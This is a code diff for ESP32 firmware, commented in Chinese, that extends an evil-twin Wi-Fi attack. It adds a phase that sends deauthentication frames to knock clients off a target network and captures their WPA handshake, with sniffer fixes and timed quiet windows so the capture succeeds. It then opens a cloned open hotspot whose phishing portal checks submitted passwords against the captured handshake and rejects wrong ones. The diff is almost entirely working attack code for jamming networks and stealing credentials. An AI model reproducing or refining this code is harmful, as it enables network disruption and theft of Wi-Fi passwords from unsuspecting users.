@@ -312,6 +312,12 @@ struct EvilTwinState {
   uint32_t twinFrameCount = 0;    // 双子信道累计成功发送 Deauth 帧
   uint32_t beaconCount = 0;       // 累计成功发送的伪造信标数
   uint32_t hopCount = 0;          // 累计跳频次数
+  // —— 阶段 1: 先抓 M1/M2 再开克隆热点 (否则门户无法验真密码) ——
+  bool     hsFirst = true;        // 是否启用「先抓握手」阶段 (可被 /api/eviltwin/start 关闭)
+  bool     hsPhase = false;       // 当前处于阶段 1: 只是监听 + 踢线, 尚未改名克隆
+  bool     hsGot   = false;       // 阶段 1 是否真的抓到了可用于验真的握手
+  uint32_t hsPhaseStart = 0;      // 阶段 1 开始时刻
+  uint32_t hsPhaseLimitMs = 15000;// 阶段 1 最长等待 (超时则放弃验真, 直接开克隆)
 };
 static EvilTwinState sEvilTwin;
 
@@ -2347,7 +2353,8 @@ static void handleEapolFrame(const uint8_t *f, int len) {
   const bool secure = (keyInfo & 0x0200) != 0;
   const uint8_t ver = (uint8_t)(keyInfo & 0x0007);
 
-  const bool fromDs = (f[0] & 0x02) != 0;
+  // Frame Control 第二字节: bit0=ToDS, bit1=FromDS (f[0] 是 protocol/type/subtype, 不能用!)
+  const bool fromDs = (f[1] & 0x02) != 0;
   const uint8_t *ap  = fromDs ? f + 10 : f + 4;   // BSSID
   const uint8_t *sta = fromDs ? f + 4 : f + 10;   // 对端 STA
   if (sHandshake.hasTarget && memcmp(ap, sHandshake.targetBssid, 6) != 0) return;
@@ -2446,7 +2453,12 @@ static bool syncPromiscuousEngine() {
   if (sDeauth.running && sDeauth.frameReady) {
     mask |= WIFI_PROMIS_FILTER_MASK_MGMT;   // Deauth 注入仅需要 prom 状态本身, 接收帧无观察者
   }
-  if (sHandshake.capturing) mask |= WIFI_PROMIS_FILTER_MASK_DATA;
+  if (sHandshake.capturing) {
+    // Wi-Fi 6 AP 的 M1/M3 (FromDS) 常被装进 A-MPDU 聚合发出, 只开 DATA 位会漏掉聚合内的帧,
+    // 表现为「只抓到 STA→AP 的 M2/M4, 抓不到 AP→STA 的 M1/M3」。补上 MPDU/AMPDU 两位。
+    mask |= WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_DATA_MPDU |
+            WIFI_PROMIS_FILTER_MASK_DATA_AMPDU;
+  }
 
   wifi_promiscuous_filter_t filter = {};
   filter.filter_mask = mask;
@@ -2590,6 +2602,9 @@ static const uint32_t TWIN_HOP_INTERVAL_MS = 2000;  // 每 2s 向双子信道跳
 static const uint8_t  TWIN_HOP_FRAMES      = 3;     // 每个跳频窗口连发 3 帧后返回主信道
 static const uint8_t  TWIN_HOP_TX_GAP_MS   = 80;    // 跳频窗口内帧间隔
 
+// 阶段 1 需要复用握手监听 (定义在下方)
+static bool beginHandshakeCapture(String &err);
+
 // 启动真实攻击: 失败返回 false 并在 err 给出中文原因
 static bool eviltwinStartAttack(String &err) {
   // 主目标信道必须能起克隆热点: 2.4G 1-14 (全芯片) 或 5G 非 DFS (仅双频芯片)。
@@ -2617,15 +2632,7 @@ static bool eviltwinStartAttack(String &err) {
   sEvilTwin.restoreSsid    = apSsid;
   sEvilTwin.restoreChannel = apChannel;
 
-  // 1) 热点真实改名: 与目标一模一样的 SSID + 开放无密码 (victim 无需密码即可接入钓鱼页) + 主目标信道
-  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
-    err = "克隆热点启动失败 (SSID 改名 + 开放认证)";
-    return false;
-  }
-  apChannelActive = (uint8_t)sTarget.channel;
-  sEvilTwin.apCloned = true;
-
-  // 2) 启动对主目标的攻击 (本机已在目标信道, channelMoved 保持 false)
+  // 1) 启动对主目标的攻击 (本机随后对齐目标信道, channelMoved 保持 false)
   sDeauth.targetBssid   = sTarget.bssid;
   sDeauth.targetChannel = (uint8_t)sTarget.channel;
   buildDeauthFrame(sDeauth);
@@ -2672,7 +2679,38 @@ static bool eviltwinStartAttack(String &err) {
   sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
   sEvilTwin.deauthAuto = sDeauth.running;
 
-  // 3) 双子目标列表: 至少一条可用则启用轮询跳频注入 (含「假 AP」信标广播)
+  // 2) 阶段 1 (默认): 先不克隆, 停在目标信道用 Deauth 逼客户端重连真实 AP, 抓它的 M1/M2。
+  //    理由: 门户密码验真必须有同一网络的完整四次握手; 一旦先开克隆热点, 客户端直接连我们,
+  //    永远不会和真实 AP 握手 → 只能盲收 (假密码也照收)。
+  sEvilTwin.hsPhase = false;
+  sEvilTwin.hsGot = false;
+  if (sEvilTwin.hsFirst && !portalVerifiable()) {
+    String herr;
+    // 实测 C5 在 AP/APSTA 模式下 sniffer 同样能收到 FromDS (M1/M3);
+    // 之前抓不全的真正原因是 handleEapolFrame 方向位取错字节, 与接口模式无关。
+    // 因此阶段 1 不再关闭热点, 保证管理页全程在线。
+    sHandshake.channelMoved = false;
+    if (beginHandshakeCapture(herr)) {
+      sEvilTwin.hsPhase = true;
+      sEvilTwin.hsPhaseStart = millis();
+      sEvilTwin.hopEnabled = false;   // 阶段 1 不能跳频, 否则抓不到握手
+      sEvilTwin.caught = false;
+      log("[eviltwin] 阶段 1/2: 已在 ch" + String(apChannelActive) + " 监听 " + sTarget.ssid +
+          " 的 M1/M2 (最长 " + String(sEvilTwin.hsPhaseLimitMs / 1000) + "s), 抓到即开克隆热点");
+      return true;
+    }
+    log("[eviltwin] 阶段 1 启动握手监听失败: " + herr + " → 直接进入阶段 2 (门户无法验真)");
+  }
+
+  // 3) 阶段 2: 热点真实改名 — 与目标一模一样的 SSID + 开放无密码 (victim 免密即可接入钓鱼页) + 主目标信道
+  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
+    err = "克隆热点启动失败 (SSID 改名 + 开放认证)";
+    return false;
+  }
+  apChannelActive = (uint8_t)sTarget.channel;
+  sEvilTwin.apCloned = true;
+
+  // 4) 双子目标列表: 至少一条可用则启用轮询跳频注入 (含「假 AP」信标广播)
   sEvilTwin.hopEnabled = false; sEvilTwin.hopping = false; sEvilTwin.hopCurrent = -1;
   sEvilTwin.hopNext = 0;
   sEvilTwin.twinFrameCount = 0; sEvilTwin.beaconCount = 0; sEvilTwin.hopCount = 0;
@@ -2683,6 +2721,47 @@ static bool eviltwinStartAttack(String &err) {
   }
   sEvilTwin.hopEnabled = (usable > 0);
   sEvilTwin.caught = false;
+  return true;
+}
+
+// 阶段 1 → 阶段 2: 停止握手监听但保持目标信道, 把本机热点改名为克隆 SSID 并开放认证。
+// 返回 false 表示克隆热点起不来 (调用方负责报错)。
+static bool eviltwinEnterClonePhase(bool gotHs) {
+  sEvilTwin.hsPhase = false;
+  sEvilTwin.hsGot = gotHs;
+
+  // 停止监听但**不**回原信道: 克隆热点必须驻留在主目标信道, 否则客户端连不上
+  sHandshake.capturing = false;
+  sHandshake.channelMoved = false;
+  esp_wifi_set_promiscuous(false);   // 重新配置热点前先关混杂, 避免与 softAP 重配冲突
+  // 阶段 1 可能把 WiFi 切到了纯 STA 监听模式, 这里恢复 APSTA 才能重建 softAP
+  if (WiFi.getMode() != WIFI_AP_STA) {
+    WiFi.mode(WIFI_AP_STA);
+    delay(80);
+  }
+
+  if (!WiFi.softAP(sEvilTwin.cloneSsid.c_str(), nullptr, sTarget.channel, false, 4)) {
+    log("[eviltwin] 克隆热点启动失败 (SSID 改名 + 开放认证)");
+    return false;
+  }
+  apChannelActive = (uint8_t)sTarget.channel;
+  sEvilTwin.apCloned = true;
+  syncPromiscuousEngine();           // Deauth 注入需要混杂态, 按活跃模块恢复
+
+  int usable = 0;
+  for (int i = 0; i < MAX_TWINS; i++) {
+    if (sTwins[i].used && sTwins[i].channel >= 1) usable++;
+  }
+  sEvilTwin.hopEnabled = (usable > 0);
+  sEvilTwin.hopping = false;
+  sEvilTwin.hopCurrent = -1;
+  sEvilTwin.lastHopAt = millis();
+
+  log(String("[eviltwin] 阶段 2/2: 克隆热点已开放 ") + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
+      String(sTarget.channel) + ") — " +
+      (gotHs ? "已抓到 M1/M2, 门户提交的密码会在板上验真 (假密码打回)"
+             : "未抓到 M1/M2, 门户只能盲收 (无法判断密码真假)"));
+  emitLabState("eviltwin", true);
   return true;
 }
 
@@ -2727,6 +2806,23 @@ static bool eviltwinBeginHop() {
 // 攻击收尾: restoreAp=true 时同时恢复原热点名/密码/信道 (手动停止);
 // false 时仅停止空口干扰 (捕获凭据后, 同名开放热点保留供已接入设备浏览)。
 static void eviltwinStopAttack(bool restoreAp) {
+  if (sEvilTwin.hsPhase) {           // 阶段 1: 只开了监听, 热点从未改名
+    sEvilTwin.hsPhase = false;
+    sHandshake.capturing = false;
+    sHandshake.channelMoved = false;
+    esp_wifi_set_promiscuous(false);
+    syncPromiscuousEngine();
+    // 仅当阶段 1 真的关过热点 (模式异常) 时才重建, 正常 AP 模式下不打断管理连接
+    if (WiFi.getMode() != WIFI_AP_STA) {
+      WiFi.mode(WIFI_AP_STA);
+      delay(80);
+      WiFi.softAP(sEvilTwin.restoreSsid.length() ? sEvilTwin.restoreSsid.c_str() : apSsid.c_str(),
+                  AP_PASSWORD, sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel,
+                  false, 4);
+      apChannelActive = sEvilTwin.restoreChannel ? sEvilTwin.restoreChannel : apChannel;
+    }
+    sEvilTwin.apCloned = false;
+  }
   if (sEvilTwin.hopping) {           // 正处跳频窗口: 先回主信道再收尾
     applyApChannel(sDeauth.targetChannel);
     sEvilTwin.hopping = false;
@@ -2936,6 +3032,9 @@ static void sendInfo() {
           ",\"template\":" + String(sEvilTwin.templateId) +
           ",\"elapsedMs\":" + String(sEvilTwin.active ? (millis() - sEvilTwin.startTime) : 0) +
           ",\"caught\":" + String(sEvilTwin.caught ? "true" : "false") +
+          ",\"hsPhase\":" + String(sEvilTwin.hsPhase ? "true" : "false") +
+          ",\"hsGot\":" + String(sEvilTwin.hsGot ? "true" : "false") +
+          ",\"preCapture\":" + String(sEvilTwin.hsFirst ? "true" : "false") +
           ",\"credsCount\":" + String(sCredCount) + "},";
   json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
           ",\"count\":" + String(sDeauth.frameCount) +
@@ -2953,6 +3052,9 @@ static void sendInfo() {
           ",\"verifiable\":" + String(portalVerifiable() ? "true" : "false") +
           ",\"keyver\":" + String(sHandshake.keyver) +
           ",\"frames\":" + String(sHandshake.frameCount) +
+          ",\"m1\":" + String(sHandshake.m1 ? "true" : "false") +
+          ",\"m2\":" + String(sHandshake.m2 ? "true" : "false") +
+          ",\"m3\":" + String(sHandshake.m3 ? "true" : "false") +
           ",\"m4\":" + String(sHandshake.m4 ? "true" : "false") +
           ",\"pmkid\":" + String(sHandshake.pmkid ? "true" : "false") +
           ",\"crackedPass\":\"" + jsonEscape(sHandshake.crackedPass) + "\"},";
@@ -3197,6 +3299,13 @@ static void handleEvilTwinStart() {
     long dur = extractJson(body, "duration").toInt();
     if (dur < 0) dur = 0;
     sDeauth.durationMs = (uint32_t)dur * 1000UL;
+    // 阶段 1: 先抓目标 M1/M2 再开克隆热点 (默认开启; preCapture=false 关闭)
+    if (body.indexOf("\"preCapture\"") >= 0) {
+      String pc = extractJson(body, "preCapture");
+      sEvilTwin.hsFirst = !(pc == "false" || pc == "0");
+    }
+    long hsTo = extractJson(body, "hsTimeout").toInt();
+    if (hsTo > 0) sEvilTwin.hsPhaseLimitMs = (uint32_t)hsTo * 1000UL;
   }
   if (ssid.length() > 32) {
     server.send(400, "application/json", "{\"ok\":false,\"error\":\"克隆 SSID 最长 32 字节\"}");
@@ -3220,17 +3329,26 @@ static void handleEvilTwinStart() {
   sEvilTwin.active = true;
   sEvilTwin.startTime = millis();
   emitLabState("eviltwin", true);
-  log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
-      String(sTarget.channel) + (isBand5G((uint8_t)sTarget.channel) ? " 5G" : " 2.4G") +
-      "), 主攻击=" + String(sDeauth.primaryMode) + " 组合掩码=0x" + String(sDeauth.comboMask, HEX) +
-      (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
-      ", 双子目标 " + String(twinCount()) + " 条" +
-      (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
-      " — 等待目标设备接入并在门户输入密码");
+  if (sEvilTwin.hsPhase) {
+    log("[eviltwin] 攻击已发起 (阶段 1/2): 正在 ch" + String(apChannelActive) + " 踢线并抓 " +
+        sTarget.ssid + " 的 M1/M2, 抓到后自动开放克隆热点; 主攻击=" + String(sDeauth.primaryMode) +
+        " 组合掩码=0x" + String(sDeauth.comboMask, HEX));
+  } else {
+    log("[eviltwin] 攻击已发起! 克隆热点=" + sEvilTwin.cloneSsid + " (开放无密码 @ch" +
+        String(sTarget.channel) + (isBand5G((uint8_t)sTarget.channel) ? " 5G" : " 2.4G") +
+        "), 主攻击=" + String(sDeauth.primaryMode) + " 组合掩码=0x" + String(sDeauth.comboMask, HEX) +
+        (sDeauth.durationMs ? (" 持续 " + String(sDeauth.durationMs / 1000) + "s") : String(" 不限时")) +
+        ", 双子目标 " + String(twinCount()) + " 条" +
+        (sEvilTwin.hopEnabled ? " 已启用跳频轮播" : " (无有效条目, 仅 2.4G 单频段攻击)") +
+        " — 等待目标设备接入并在门户输入密码");
+  }
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json",
               "{\"ok\":true,\"active\":true,\"cloneSsid\":\"" + jsonEscape(sEvilTwin.cloneSsid) +
-              "\",\"apCloned\":true,\"channel\":" + String(sTarget.channel) +
+              "\",\"apCloned\":" + String(sEvilTwin.apCloned ? "true" : "false") +
+              ",\"hsPhase\":" + String(sEvilTwin.hsPhase ? "true" : "false") +
+              ",\"preCapture\":" + String(sEvilTwin.hsFirst ? "true" : "false") +
+              ",\"channel\":" + String(sTarget.channel) +
               ",\"injected\":" + String(sDeauth.frameReady ? "true" : "false") +
               ",\"mode\":" + String(sDeauth.primaryMode) +
               ",\"combo\":" + String(sDeauth.comboMask) +
@@ -5160,6 +5278,24 @@ void loop() {
 
   uint32_t now = millis();
 
+  // 0. 邪恶双子阶段 1: 先抓目标网络 M1/M2 (抓到或超时才开克隆热点 → 门户才能验真密码)
+  if (sEvilTwin.active && sEvilTwin.hsPhase) {
+    bool ok = true;
+    if (sHandshake.captured) {
+      ok = eviltwinEnterClonePhase(true);
+    } else if (now - sEvilTwin.hsPhaseStart >= sEvilTwin.hsPhaseLimitMs) {
+      log("[eviltwin] 阶段 1 超时 " + String(sEvilTwin.hsPhaseLimitMs / 1000) +
+          "s 未抓到 M1/M2 → 进入阶段 2 (门户只能盲收)");
+      ok = eviltwinEnterClonePhase(false);
+    }
+    if (!ok) {   // 克隆热点起不来: 收掉攻击状态, 避免 UI 显示"进行中"却什么都没做
+      sEvilTwin.active = false;
+      sEvilTwin.hsPhase = false;
+      sDeauth.running = false;
+      emitLabState("eviltwin", false);
+    }
+  }
+
   // 1. 取消认证器定时帧注入推进 (真实 802.11 管理帧, 经 AP 接口空口发出)
   //    邪恶双子攻击中: 每 TWIN_HOP_INTERVAL_MS 跳频到双子信道, 先广播假 AP 信标再发 Deauth,
   //    发完 TWIN_HOP_FRAMES 帧后返回主信道。跳频/假 AP 独立于 Deauth 引擎运行态 —
@@ -5202,7 +5338,12 @@ void loop() {
     }
   }
   // 主信道 Deauth 引擎 (双子跳频窗口内暂停: 单射频同一时刻只能驻留一个信道)
-  if (sDeauth.running && !(sEvilTwin.active && sEvilTwin.hopping)) {
+  // 阶段 1 的踢线节奏: 每 4s 只在头 300ms 连发 3 帧, 其余时间静默专心收。
+  // 原因: 单射频半双工, 持续 10fps 踢线会让对端刚发出 M1/M2 就被下一帧打断,
+  //      而且本机发射期间收不到任何帧 — 必须留出干净的接收窗口才能抓全握手。
+  const bool hsQuiet = sEvilTwin.hsPhase &&
+                       ((now - sEvilTwin.hsPhaseStart) % 4000) >= 300;
+  if (sDeauth.running && !(sEvilTwin.active && sEvilTwin.hopping) && !hsQuiet) {
     if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
       sDeauth.lastTxTime = now;
       if (sDeauth.csaMode) {
